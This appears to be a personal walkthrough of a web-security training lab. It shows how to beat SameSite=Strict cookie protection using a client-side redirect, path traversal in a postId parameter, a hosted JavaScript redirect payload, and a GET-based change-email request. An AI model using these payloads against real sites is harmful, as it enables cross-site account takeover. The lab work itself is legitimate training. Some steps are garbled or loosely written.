 This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

Credentials: 
username: wiener
password: peter

- Note that the request POST/login It's defined as SameSite=Strict

- Analyze the comment action in a post. The URL will look like:
https://0ade000203c86cd884dbb8530071000e.web-security-academy.net/post/comment/confirmation?postId=8

- In the browser, visit this URL, but change the postId parameter to an arbitrary string:
/post/comment/confirmation?postId=test

- Try injecting a path transversal:
/post/comment/confirmation?postId=1/../../my-account
* This confirms that you can use the postId parameter to elicit a GET request for an arbitrary endpoint on the target site

- Add a script in the exploit server so that induces the browser to see like a GET request:
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
</script>
* Observe that when the client-side redirect takes place, you still end up on your logged-in account page. This confirms that the browser included your authenticated session cookie in the second request, even though the initial comment-submission request was initiated from an arbitrary external site.

- Send the POST/my-account/change-email request to repeater and then Change the method

- Back on the exploit server, add:
/my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
* The email cannot been areldy used

- Store and deliver to the victim
